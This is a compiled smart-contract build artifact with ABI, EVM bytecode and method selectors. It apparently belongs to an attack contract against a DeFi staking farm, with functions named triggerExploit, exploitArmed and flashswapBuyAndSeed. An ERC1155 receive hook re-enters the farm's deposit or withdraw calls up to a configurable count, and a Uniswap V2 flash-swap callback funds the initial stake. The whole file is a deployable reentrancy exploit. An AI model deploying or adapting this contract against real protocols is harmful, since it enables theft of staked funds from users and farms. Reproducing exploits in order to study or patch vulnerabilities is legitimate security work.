{"abi":[{"type":"constructor","inputs":[{"name":"farm_","type":"address","internalType":"address"},{"name":"controller_","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"activePid","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"configure","inputs":[{"name":"pid_","type":"uint256","internalType":"uint256"},{"name":"maxReentries_","type":"uint256","internalType":"uint256"},{"name":"useWithdrawPath_","type":"bool","internalType":"bool"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"exploitArmed","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"flashswapBuyAndSeed","inputs":[{"name":"pid_","type":"uint256","internalType":"uint256"},{"name":"tokenOut","type":"address","internalType":"address"},{"name":"pair","type":"address","internalType":"address"},{"name":"amountOut","type":"uint256","internalType":"uint256"},{"name":"repayAmount","type":"uint256","internalType":"uint256"},{"name":"tokenOutIsToken0","type":"bool","internalType":"bool"}],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"maxReentries","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"onERC1155BatchReceived","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256[]","internalType":"uint256[]"},{"name":"","type":"uint256[]","internalType":"uint256[]"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[{"name":"","type":"bytes4","internalType":"bytes4"}],"stateMutability":"pure"},{"type":"function","name":"onERC1155Received","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"id","type":"uint256","internalType":"uint256"},{"name":"value","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[{"name":"","type":"bytes4","internalType":"bytes4"}],"stateMutability":"nonpayable"},{"type":"function","name":"reentryCount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"seedStake","inputs":[{"name":"pid_","type":"uint256","internalType":"uint256"},{"name":"token","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"stakedAmount","inputs":[{"name":"pid_","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"triggerExploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"useWithdrawPath","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"}],"bytecode":{"object":"0x60c0346100bb57601f610fd938819003918201601f19168301916001600160401b038311848410176100bf5780849260409485528339810103126100bb57610052602061004b836100d3565b92016100d3565b6001600160a01b0390911660805260a052604051610ef190816100e88239608051818181610106015281816101ec015281816104f80152818161083a015281816108c60152610977015260a05181818160d6015281816103800152818161078401526107e90152f35b5f80fd5b634e487b7160e01b5f52604160045260245ffd5b51906001600160a01b03821682036100bb5756fe608080604052600436101561001c575b50361561001a575f80fd5b005b5f905f3560e01c90816310d1e85c14610a4f5750806313caa01a14610a2c578063352bb4ba14610a0e57806353b38169146109f05780635a459ed414610942578063701d8159146107d2578063808783841461075f57806386b79640146107395780638f20f7ed1461071c578063bc197c8114610680578063e3be69dc1461033b578063f23a6e61146101a45763ff201bc60361000f573461019257606036600319011261019257806100cd610c47565b604435610104337f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031614610d2b565b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03169161014690829084906101418282610dc0565b610e7d565b813b156101a0578291604483926040519485938492631c57762b60e31b8452600435600485015260248401525af18015610195576101815750f35b8161018b91610cf5565b6101925780f35b80fd5b6040513d84823e3d90fd5b5050fd5b50346101925760a0366003190112610192576101be610c31565b506101c7610c47565b5060843567ffffffffffffffff8111610337576101e8903690600401610c5d565b50507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031661021f338214610cbc565b6003549060ff8260081c168061032b575b80610320575b80610313575b610253575b60405163f23a6e6160e01b8152602090f35b60ff8392600160025401600255165f146102bf57815490803b156101a057604483926040519485938492630441a3e760e41b845260048401528160248401525af18015610195576102aa575b50505b5f8080610241565b6102b5828092610cf5565b610192578061029f565b815490803b156101a057604483926040519485938492631c57762b60e31b845260048401528160248401525af18015610195576102fe575b50506102a2565b610309828092610cf5565b61019257806102f7565b506002546001541161023c565b506064351515610236565b50825460443514610230565b5080fd5b5060c036600319011261019257610350610c47565b6044356001600160a01b0381169291908381036105cf5760643560843560a43592831515840361067c576103ae337f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031614610d2b565b8615610648578215158061063f575b1561060a576003805462010000600160b01b03191660109290921b62010000600160b01b031691909117905560045581156106035780915b156105fe5750825b60409485519161040d8784610cf5565b600e835260208301936d11931054d214d5d05417d4d1515160921b8552823b156105fa57908660a4819594938a519788968795869363022c0d9f60e01b855260048501526024840152306044840152608060648401525180918160848501528484015e8181018301849052601f01601f191681010301925af180156105db579083916105e5575b50506003805462010000600160b01b0319169055600482815583516370a0823160e01b815230918101919091526020816024816001600160a01b0386165afa9081156105db5783916105a5575b50801561056e579283610524849560018060a01b037f00000000000000000000000000000000000000000000000000000000000000001685610141828098610dc0565b823b156105695783926044849284519586938492631c57762b60e31b8452600435600485015260248401525af190811561056057506101815750f35b513d84823e3d90fd5b505050fd5b835162461bcd60e51b815260206004820152601060248201526f1393d7d4d1515117d050d4555254915160821b6044820152606490fd5b90506020813d6020116105d3575b816105c060209383610cf5565b810103126105cf57515f6104e1565b8280fd5b3d91506105b3565b84513d85823e3d90fd5b816105ef91610cf5565b61033757815f610494565b8680fd5b6103fd565b83916103f5565b60405162461bcd60e51b815260206004820152600d60248201526c04241445f464c4153485357415609c1b6044820152606490fd5b508115156103bd565b60405162461bcd60e51b815260206004820152600c60248201526b504149525f4d495353494e4760a01b6044820152606490fd5b8580fd5b50346101925760a03660031901126101925761069a610c31565b506106a3610c47565b5060443567ffffffffffffffff8111610337576106c4903690600401610c8b565b505060643567ffffffffffffffff8111610337576106e6903690600401610c8b565b505060843567ffffffffffffffff811161033757610708903690600401610c5d565b505060405163bc197c8160e01b8152602090f35b503461019257806003193601126101925760209054604051908152f35b5034610192578060031936011261019257602060ff60035460081c166040519015158152f35b503461019257606036600319011261019257604435801515809103610337576107b2337f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031614610d2b565b600435825560243560015560ff8019600354169116176003558060025580f35b5034610192578060031936011261019257610817337f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031614610d2b565b60ff60035461010061ff001982161760035582600255165f146108c057805481907f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031690813b156101a0578291604483926040519485938492630441a3e760e41b845260048401528160248401525af18015610195576108ab575b50505b61ff00196003541660035580f35b816108b591610cf5565b61019257805f61089a565b805481907f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031690813b156101a0578291604483926040519485938492631c57762b60e31b845260048401528160248401525af180156101955761092d575b505061089d565b8161093791610cf5565b61019257805f610926565b503461019257602036600319011261019257604080516393f1a40b60e01b8152600480359082015230602482015290816044817f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03165afa9081156101955782916109ba575b602082604051908152f35b90506040813d6040116109e8575b816109d560409383610cf5565b810103126103375760209150515f6109af565b3d91506109c8565b50346101925780600319360112610192576020600254604051908152f35b50346101925780600319360112610192576020600154604051908152f35b5034610192578060031936011261019257602060ff600354166040519015158152f35b905034610c00576080366003190112610c0057610a6a610c31565b9060643567ffffffffffffffff8111610c0057610a8b903690600401610c5d565b505060035460101c6001600160a01b03163303610c045750610ab7906001600160a01b03163014610cbc565b60045473c02aaa39b223fe8d0a0e5c4f27ead9083c756cc23b15610c00575f60049160405192838092630d0e30db60e41b825273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc25af18015610bf557610be2575b5060045460405163a9059cbb60e01b60208201908152336024830152604482019290925282918291610b4b81606481015b03601f198101835282610cf5565b51908273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc25af1610b6d610d69565b81610bb3575b5015610b7c5780f35b60405162461bcd60e51b815260206004820152600f60248201526e1514905394d1915497d19052531151608a1b6044820152606490fd5b8051801592508215610bc8575b50505f610b73565b610bdb9250602080918301019101610da8565b5f80610bc0565b610bee91505f90610cf5565b5f5f610b0c565b6040513d5f823e3d90fd5b5f80fd5b62461bcd60e51b81526020600482015260086024820152672120a22fa820a4a960c11b6044820152606490fd5b600435906001600160a01b0382168203610c0057565b602435906001600160a01b0382168203610c0057565b9181601f84011215610c005782359167ffffffffffffffff8311610c005760208381860195010111610c0057565b9181601f84011215610c005782359167ffffffffffffffff8311610c00576020808501948460051b010111610c0057565b15610cc357565b60405162461bcd60e51b815260206004820152600a6024820152692120a22fa9a2a72222a960b11b6044820152606490fd5b90601f8019910116810190811067ffffffffffffffff821117610d1757604052565b634e487b7160e01b5f52604160045260245ffd5b15610d3257565b60405162461bcd60e51b815260206004820152600f60248201526e27a7262cafa1a7a72a2927a62622a960891b6044820152606490fd5b3d15610da3573d9067ffffffffffffffff8211610d175760405191610d98601f8201601f191660200184610cf5565b82523d5f602084013e565b606090565b90816020910312610c0057518015158103610c005790565b60405163095ea7b360e01b602082019081526001600160a01b0390931660248201525f60448083018290528252928392918390610dfe606482610cf5565b51925af1610e0a610d69565b81610e4e575b5015610e1857565b60405162461bcd60e51b815260206004820152600e60248201526d1054141493d59157d1905253115160921b6044820152606490fd5b8051801592508215610e63575b50505f610e10565b610e769250602080918301019101610da8565b5f80610e5b565b60405163095ea7b360e01b602082019081526001600160a01b03909316602482015260448101939093525f928392908390610dfe8160648101610b3d56fea26469706673582212202a153e3a1c4dd8a9dda83275c3a58fb98df69bcbe81878f6ad30249653d8f06364736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"activePid()":"8f20f7ed","configure(uint256,uint256,bool)":"80878384","exploitArmed()":"86b79640","flashswapBuyAndSeed(uint256,address,address,uint256,uint256,bool)":"e3be69dc","maxReentries()":"352bb4ba","onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)":"bc197c81","onERC1155Received(address,address,uint256,uint256,bytes)":"f23a6e61","reentryCount()":"53b38169","seedStake(uint256,address,uint256)":"ff201bc6","stakedAmount(uint256)":"5a459ed4","triggerExploit()":"701d8159","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c","useWithdrawPath()":"13caa01a"},"id":0}